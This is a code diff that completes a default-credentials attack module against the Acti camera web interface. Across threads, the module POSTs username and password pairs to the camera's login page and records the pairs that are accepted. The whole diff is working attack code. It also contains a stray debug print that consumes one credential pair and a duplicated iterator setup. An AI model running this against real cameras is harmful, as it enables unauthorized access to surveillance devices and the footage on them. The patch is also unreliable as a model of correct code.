@@ -33,6 +33,9 @@ class Exploit(HTTPClient):
             return
 
         print_status("Starting default credentials attack against Acti Camera Web Interface")
+
+        data = LockedIterator(self.defaults)
+        print(data.next())
         self.run_threads(self.threads, self.target_function, data)
 
         if self.credentials:
@@ -42,8 +45,31 @@ class Exploit(HTTPClient):
         else:
             print_error("Credentials not found")
 
-    def target_function(self, data):
-        pass
+    def target_function(self, running, creds):
+        while running.is_set():
+            try:
+                username, password = creds.next().split(":")
+
+                data = {
+                    "LOGIN_ACCOUNT": username,
+                    "LOGIN_PASSWORD": password,
+                    "LANGUAGE": "0",
+                    "btnSubmit": "Login",
+                }
+
+                response = self.http_request(
+                    method="POST",
+                    path="/video.htm",
+                    data=data
+                )
+
+                if response is None:
+                    continue
+
+                if ">Password<" not in response.text:
+                    self.credentials.append((self.target, self.port, self.target_protocol, username, password))
+            except StopIteration:
+                break
 
     def check(self):
         response = self.http_request(
@@ -61,7 +87,8 @@ class Exploit(HTTPClient):
         if self.check():
             self.credentials = []
 
-            self.run_threads(self.threads, self.target_function, self.defaults)
+            data = LockedIterator(self.defaults)
+            self.run_threads(self.threads, self.target_function, data)
 
             if self.credentials:
                 return self.credentials
